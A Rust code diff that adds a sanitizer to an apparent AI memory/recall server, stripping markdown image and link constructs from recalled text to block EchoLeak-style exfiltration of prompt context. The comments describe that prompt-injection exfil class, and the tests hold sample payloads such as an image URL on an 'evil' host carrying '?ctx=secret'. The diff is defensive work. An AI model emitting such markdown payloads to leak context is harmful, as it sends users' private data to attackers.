@@ -343,6 +343,82 @@ pub fn redact_content(
     out
 }
 
+/// v1.20.27 "Cordon": neutralize the EchoLeak markdown exfil class on emitted
+/// text. Rewrites `![alt](url)` → `[alt]` and `[text](url)` → `text` so a
+/// recalled chunk cannot carry a remote reference that a downstream markdown
+/// renderer would dereference (image pixel / link referer exfil of surrounding
+/// prompt context — the EchoLeak / CVE-2025-32711 class). Bare URLs in plain
+/// prose are LEFT INTACT — rewriting `see example.com` would mangle legitimate
+/// recall and is a false-positive trap; only the markdown link/image
+/// *construct* is targeted.
+///
+/// ponytail: this is a deterministic text transform, not a markdown parser and
+/// not a URL reputation service. Storage stays verbatim — this is render/
+/// output only, exactly like `strip_invisible`. Ceiling: a non-markdown exfil
+/// vector ("visit attacker.com" in prose) survives — that is model-discipline /
+/// host-contract territory, out of scope for a deterministic strip. Runs BEFORE
+/// `strip_invisible` so a bidi-wrapped `]` can't defeat the bracket scan after
+/// invisible stripping.
+pub fn strip_markdown_refs(s: &str) -> String {
+    let bytes = s.as_bytes();
+    let mut out = String::with_capacity(s.len());
+    let mut i = 0usize;
+    while i < bytes.len() {
+        // Image construct: `![label](url)` → `[label]` (drop the `!` and the
+        // `(url)`; brackets stay so the result is plain text, not itself a link).
+        if bytes[i] == b'!' && i + 1 < bytes.len() && bytes[i + 1] == b'[' {
+            if let Some((label_start, label_end, url_close)) = scan_link_construct(bytes, i + 1) {
+                out.push('[');
+                out.push_str(&s[label_start..label_end]);
+                out.push(']');
+                i = url_close + 1;
+                continue;
+            }
+        }
+        // Link construct: `[label](url)` → `label` (drop the brackets and url).
+        if bytes[i] == b'[' {
+            if let Some((label_start, label_end, url_close)) = scan_link_construct(bytes, i) {
+                out.push_str(&s[label_start..label_end]);
+                i = url_close + 1;
+                continue;
+            }
+        }
+        // Default: pass the char through byte-for-byte (advance on a char
+        // boundary — a byte-wise `i += 1` would desync on multibyte input).
+        let ch = s[i..].chars().next().expect("non-empty slice");
+        out.push(ch);
+        i += ch.len_utf8();
+    }
+    out
+}
+
+/// From an opening `[` at `open_bracket`, look for the complete link construct
+/// `[label](url)`. Returns `(label_start, label_end, url_close)` byte offsets:
+/// `label_start..label_end` is the inner label (exclusive of the brackets),
+/// `url_close` is the index of the closing `)`. Returns `None` unless a `]` is
+/// immediately followed by `(` and a matching `)` exists — the caller then
+/// emits the `[` verbatim and continues. All delimiters are ASCII, so every
+/// offset returned lands on a char boundary and the label slice is valid UTF-8.
+fn scan_link_construct(bytes: &[u8], open_bracket: usize) -> Option<(usize, usize, usize)> {
+    debug_assert_eq!(bytes[open_bracket], b'[');
+    let label_start = open_bracket + 1;
+    // First `]` after the opening `[` (CommonMark: the bracket contents cannot
+    // themselves contain an unescaped `]`).
+    let label_end_rel = bytes[label_start..].iter().position(|&b| b == b']')?;
+    let label_end = label_start + label_end_rel;
+    // `]` must be IMMEDIATELY followed by `(` — allowing whitespace would
+    // false-positive on prose like `[note] (see ref 5)`.
+    let paren_open = label_end + 1;
+    if paren_open >= bytes.len() || bytes[paren_open] != b'(' {
+        return None;
+    }
+    // First `)` after the opening `(` (nested parens in a url are not handled;
+    // the trailing fragment is harmless — the remote ref is already dropped).
+    let url_start = paren_open + 1;
+    let url_close_rel = bytes[url_start..].iter().position(|&b| b == b')')?;
+    Some((label_start, label_end, url_start + url_close_rel))
+}
+
 /// v1.20.25 "Consolidate": the read-path output seam. Applies PII redaction
 /// (when the row is PII-flagged and the principal holds no `pii:read`) AND the
 /// invisible-Unicode strip (bidi / zero-width / tag-block smuggling) to EVERY
@@ -350,8 +426,16 @@ pub fn redact_content(
 /// not just `content`. The HTTP surface (recall/search, /get, /multi-get) feeds
 /// every field through this, closing the raw-invisible-Unicode gap the v1.20.24
 /// Sweep left on the HTTP JSON boundary. Idempotent; safe where clients re-strip.
+///
+/// v1.20.27 "Cordon": order is redact (PII spans) → strip_markdown_refs (drop
+/// remote refs) → strip_invisible (bidi/ZW). Markdown stripping runs after PII
+/// redaction and before invisible-Unicode stripping; `redact_content`'s
+/// `[redacted:*]` placeholders carry no following `(...)`, so they pass through
+/// `strip_markdown_refs` untouched (no interaction).
 pub fn sanitize_read(s: &str, pii: bool, principal: &Option<crate::auth::Principal>) -> String {
-    brain_server::strip_invisible::strip_invisible(&redact_content(s, pii, principal))
+    brain_server::strip_invisible::strip_invisible(&strip_markdown_refs(&redact_content(
+        s, pii, principal,
+    )))
 }
 
 /// [`sanitize_read`] for an optional field (title / snippet / heading_path).
@@ -785,5 +869,39 @@ mod tests {
         assert_eq!(retention_reason(None, e2), Some("kind_policy"));
         // Not decayed → None.
         assert_eq!(retention_reason(None, None), None);
+    }
+
+    /// v1.20.27 "Cordon": the markdown link/image construct is neutralized —
+    /// `![alt](url)` → `[alt]` (drop `!` + url), `[text](url)` → `text` (drop
+    /// brackets + url). Bare prose and labels survive.
+    #[test]
+    fn strip_markdown_neutralizes_image_and_link() {
+        let input = "see ![logo](https://evil/p.png?d=x) and [docs](http://evil/d)";
+        assert_eq!(strip_markdown_refs(input), "see [logo] and docs");
+    }
+
+    /// v1.20.27 "Cordon": false-positive guard. Bare URLs in prose and plain
+    /// text pass through unchanged; malformed/unterminated brackets must not
+    /// panic and must pass through verbatim.
+    #[test]
+    fn strip_markdown_leaves_bare_urls_and_plain_text() {
+        assert_eq!(
+            strip_markdown_refs("see example.com and plain text"),
+            "see example.com and plain text"
+        );
+        // Unterminated brackets — no closing `]`, so no construct match.
+        assert_eq!(strip_markdown_refs("a [ b ( c"), "a [ b ( c");
+        // Image marker with no construct at all.
+        assert_eq!(strip_markdown_refs("![only"), "![only");
+    }
+
+    /// v1.20.27 "Cordon": end-to-end through the read seam. A PII-clean chunk
+    /// (pii=false → redact_content passes through) carrying an image-pixel
+    /// exfil URL loses the URL but keeps the label and surrounding text.
+    #[test]
+    fn sanitize_read_applies_markdown_strip_end_to_end() {
+        let chunk = "notes: ![logo](https://evil/p.png?ctx=secret) end";
+        let out = sanitize_read(chunk, false, &None);
+        assert_eq!(out, "notes: [logo] end");
     }
 }
